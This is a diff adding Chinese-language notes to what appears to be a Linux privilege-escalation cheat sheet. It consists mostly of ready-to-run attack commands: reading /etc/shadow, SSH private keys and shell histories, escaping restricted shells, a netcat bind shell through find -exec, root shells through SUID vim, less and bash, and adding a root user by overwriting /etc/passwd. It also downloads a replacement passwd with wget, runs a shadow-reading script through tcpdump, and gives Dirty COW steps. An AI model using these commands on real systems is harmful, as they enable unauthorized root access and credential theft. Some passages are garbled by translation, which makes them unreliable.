@@ -212,3 +212,263 @@ sudo -l
 cat /etc/passwd
 cat /etc/group
 cat /etc/shadow
+
+用户正在做什么？是否有纯文本密码？他们在编辑什么？
+
+```bash
+cat ~/.bash_history
+cat ~/.nano_history
+cat ~/.atftp_history
+cat ~/.mysql_history
+cat ~/.php_history
+```
+
+用户信息
+
+```bash
+cat ~/.bashrc cat ~/.profile
+cat /var/mail/root
+cat /var/spool/mail/root
+```
+
+私钥信息
+
+```bash
+cat ~/.ssh/authorized_keys
+cat ~/.ssh/identity.pub
+cat ~/.ssh/identity
+cat ~/.ssh/id_rsa.pub
+cat ~/.ssh/id_rsa
+cat ~/.ssh/id_dsa.pub
+cat ~/.ssh/id_dsa
+cat /etc/ssh/ssh_config
+cat /etc/ssh/sshd_config
+cat /etc/ssh/ssh_host_dsa_key.pub
+cat /etc/ssh/ssh_host_dsa_key
+cat /etc/ssh/ssh_host_rsa_key.pub
+cat /etc/ssh/ssh_host_rsa_key
+cat /etc/ssh/ssh_host_key.pub
+cat /etc/ssh/ssh_host_key
+```
+
+### 文件系统
+
+可以在/ etc /中写入哪些配置文件？能够重新配置服务？
+
+```bash
+ls -aRl /etc/ | awk '$1 ~ /^.*w.*/' 2>/dev/null # Anyone
+ls -aRl /etc/ | awk '$1 ~ /^..w/' 2>/dev/null # Owner
+ls -aRl /etc/ | awk '$1 ~ /^.....w/' 2>/dev/null # Group
+ls -aRl /etc/ | awk '$1 ~ /w.$/' 2>/dev/null # Other
+find /etc/ -readable -type f 2>/dev/null # Anyone
+find /etc/ -readable -type f -maxdepth 1 2>/dev/null # Anyone
+```
+
+在/ var /中可以找到什么？
+
+```bash
+ls -alh /var/log
+ls -alh /var/mail
+ls -alh /var/spool
+ls -alh /var/spool/lpd
+ls -alh /var/lib/pgsql
+ls -alh /var/lib/mysql
+cat /var/lib/dhcp3/dhclient.leases
+```
+
+网站上是否有任何设置/文件（隐藏）？有数据库信息的任何设置文件吗？
+
+```bash
+ls -alhR /var/www/
+ls -alhR /srv/www/htdocs/
+ls -alhR /usr/local/www/apache22/data/
+ls -alhR /opt/lampp/htdocs/
+ls -alhR /var/www/html/
+```
+
+日志文件中是否有任何内容
+
+```bash
+cat /etc/httpd/logs/access_log
+cat /etc/httpd/logs/access.log
+cat /etc/httpd/logs/error_log
+cat /etc/httpd/logs/error.log
+cat /var/log/apache2/access_log
+cat /var/log/apache2/access.log
+cat /var/log/apache2/error_log
+cat /var/log/apache2/error.log
+cat /var/log/apache/access_log
+cat /var/log/apache/access.log
+cat /var/log/auth.log
+cat /var/log/chttp.log
+cat /var/log/cups/error_log
+cat /var/log/dpkg.log
+cat /var/log/faillog
+cat /var/log/httpd/access_log
+cat /var/log/httpd/access.log
+cat /var/log/httpd/error_log
+cat /var/log/httpd/error.log
+cat /var/log/lastlog
+cat /var/log/lighttpd/access.log
+cat /var/log/lighttpd/error.log
+cat /var/log/lighttpd/lighttpd.access.log
+cat /var/log/lighttpd/lighttpd.error.log
+cat /var/log/messages
+cat /var/log/secure
+cat /var/log/syslog
+cat /var/log/wtmp
+cat /var/log/xferlog
+cat /var/log/yum.log
+cat /var/run/utmp
+cat /var/webmin/miniserv.log
+cat /var/www/logs/access_log
+cat /var/www/logs/access.log
+ls -alh /var/lib/dhcp3/
+ls -alh /var/log/postgresql/
+ls -alh /var/log/proftpd/
+ls -alh /var/log/samba/
+```
+
+如果命令受到限制，我们得跳出“受到限制”外壳吗？
+
+```bash
+python -c 'import pty;pty.spawn("/bin/bash")'
+echo os.system('/bin/bash')
+/bin/sh -i
+```
+
+Linux文件权限
+
+```bash
+find / -perm -1000 -type d 2>/dev/null # Sticky bit - Only the owner of the
+find / -perm -g=s -type f 2>/dev/null # SGID (chmod 2000) - run as the gro
+find / -perm -u=s -type f 2>/dev/null # SUID (chmod 4000) - run as the own
+
+```
+
+可以在哪里写入和执行？一些“常见”位置：/ tmp，/ var / tmp，/ dev /
+shm
+
+```bash
+find / -writable -type d 2>/dev/null # world-writeable folders
+find / -perm -222 -type d 2>/dev/null # world-writeable folders
+find / -perm -o w -type d 2>/dev/null # world-writeable folders
+find / -perm -o x -type d 2>/dev/null # world-executable folders
+find / \( -perm -o w -perm -o x \) -type d 2>/dev/null # world-writeable
+```
+
+### 准备和查找漏洞利用代码
+
+```bash
+find / -name perl*
+find / -name python*
+find / -name gcc* find / -name cc
+```
+
+### 上传文件
+
+```bash
+find / -name wget
+find / -name nc*
+find / -name netcat*
+find / -name tftp*
+find / -name ftp
+```
+
+### 内核信息收集
+
+![image-20211004141057683](C:\Users\DISPLAY\AppData\Roaming\Typora\typora-user-images\image-20211004141057683.png)
+
+通过脏牛（CVE-2016-5195）利用易受攻击的机器
+
+```bash
+$ whoami 命令–告诉我们当前用户是john（非root用户）
+$ uname -a –给我们我们知道容易受到dirtycow攻击的内核版本>从此处下载dirtycow漏洞
+– https：//www.exploit-db .com / exploits / 40839 />编译并执行。通过编辑/ etc / passwd
+文件，它将“ root”用户替换为新用户“ rash”。
+$ su rash –将当前登录用户更改为root用户的“ rash”。
+```
+
+
+
+### find
+
+nc 反弹 shell
+
+```bash
+find test -exec netcat -lvp 5555 -e /bin/sh \;
+```
+
+### vi/vim
+
+Vim的主要用途是用作文本编辑器。 但是，如果以SUID运行，它将继承root用户的权
+限，因此可以读取系统上的所有文件。
+打开vim,按下ESC
+
+```bash
+:set shell=/bin/sh
+:shell
+
+或
+
+sudo vim -c '!sh'
+```
+
+### bash
+
+以下命令将以root身份打开一个bash shell。
+
+```bash
+bash -p
+bash-3.2# id
+uid=1002(service) gid=1002(service) euid=0(root) groups=1002(service)
+```
+
+### less
+
+程序Less也可以执行提权后的shell。同样的方法也适用于其他许多命令。
+
+```bash
+less /etc/passwd
+!/bin/sh
+
+```
+
+### cp
+
+覆盖 /etc/shadow 或 /etc/passwd
+
+```bash
+[root@localhost ~]$ cat /etc/passwd >passwd
+[root@localhost ~]$ openssl passwd -1 -salt hack hack123
+$1$hack$WTn0dk2QjNeKfl.DHOUue0
+[root@localhost ~]$ echo 'hack:$1$hack$WTn0dk2QjNeKfl.DHOUue0:0:0::/root/:/
+[root@localhost ~]$ cp passwd /etc/passwd
+[root@localhost ~]$ su - hack
+Password:
+[root@123 ~]# id
+uid=0(hack) gid=0(root) groups=0(root)
+[root@123 ~]# cat /etc/passwd|tail -1
+hack:$1$hack$WTn0dk2QjNeKfl.DHOUue0:0:0::/root/:/bin/bash
+```
+
+### wget
+
+```bash
+wget http://192.168.56.1:8080/passwd -O /etc/passwd
+```
+
+### tcpdump
+
+```bash
+echo $'id\ncat /etc/shadow' > /tmp/.test
+chmod +x /tmp/.test
+sudo tcpdump -ln -i eth0 -w /dev/null -W 1 -G 1 -z /tmp/.test -Z root
+```
+
+### python
+
+```bash
+python -c "import os;os.system('/bin/bash')"
+```
+
